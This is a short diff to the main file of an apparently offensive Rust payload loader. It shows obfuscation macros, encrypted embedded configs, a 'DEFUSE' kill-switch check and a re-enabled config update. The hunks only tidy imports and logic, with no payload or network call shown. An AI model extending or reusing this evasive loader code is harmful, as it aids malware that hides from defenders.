@@ -1,5 +1,5 @@
-use malleable_rust_loader::link::LinkFetch;
 use malleable_rust_loader::config::Config;
+//use malleable_rust_loader::link::LinkFetch;
 use std::{thread, time};
 
 #[macro_use]
@@ -12,7 +12,7 @@ use malleable_rust_loader::dataoperation::DataOperation;
 use log::debug;
 use log::error;
 use log::info;
-use log::warn;
+//use log::warn;
 extern crate env_logger;
 use cryptify;
 
@@ -32,9 +32,8 @@ const INITIAL_LOADER : &[u8] = include_bytes!("/projects/config/initial.json.aea
 #[cfg(feature="ollvm")]
 const INITIAL_LOADER_DATAOPE: &[u8] = include_bytes!("/projects/config/initial.json.aead.dataop.rot13b64");
 
-
 fn main() {
-    #[cfg(feature="logdebug")]
+    #[cfg(feature = "logdebug")]
     env_logger::init();
 
     cryptify::flow_stmt!();
@@ -74,8 +73,8 @@ fn main() {
             error!("{}", lc!("[!] DEFUSE STOP reload config"));
         } else {
             info!("{}", lc!("[+] UPDATE config"));
-
-            /* 
+            config = config.update_config();
+            /*
             let mut nb_config: i32 = 0;
             let mut change_loader = false;
             let mut replacement_loaderconf: Config = Config::new_empty();
